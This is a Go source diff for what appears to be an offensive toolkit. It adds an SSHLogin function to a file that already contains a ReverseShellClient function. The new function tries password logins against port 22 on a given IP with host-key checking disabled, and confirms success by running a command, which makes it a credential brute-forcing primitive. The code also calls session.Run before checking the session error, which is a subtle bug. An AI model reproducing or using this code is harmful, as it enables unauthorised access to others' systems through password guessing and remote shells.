@@ -8,6 +8,9 @@ import (
 	"os"
 	"os/exec"
 	"strings"
+	"time"
+
+	"golang.org/x/crypto/ssh"
 )
 
 func ReverseShellClient() {
@@ -42,4 +45,28 @@ func ReverseShellClient() {
 		}
 		fmt.Println(string(buf[:readlens]))
 	}
+}
+
+// SSHLogin 嘗試登入SSH
+func SSHLogin(ip, username, password string) (bool, error) {
+	success := false
+	config := &ssh.ClientConfig{
+		User: username,
+		Auth: []ssh.AuthMethod{
+			ssh.Password(password),
+		},
+		Timeout:         3 * time.Second,
+		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
+	}
+	client, err := ssh.Dial("tcp", fmt.Sprintf("%v:%v", ip, 22), config)
+	if err == nil {
+		defer client.Close()
+		session, err := client.NewSession()
+		errRet := session.Run("echo 123456")
+		if err == nil && errRet == nil {
+			defer session.Close()
+			success = true
+		}
+	}
+	return success, err
 }
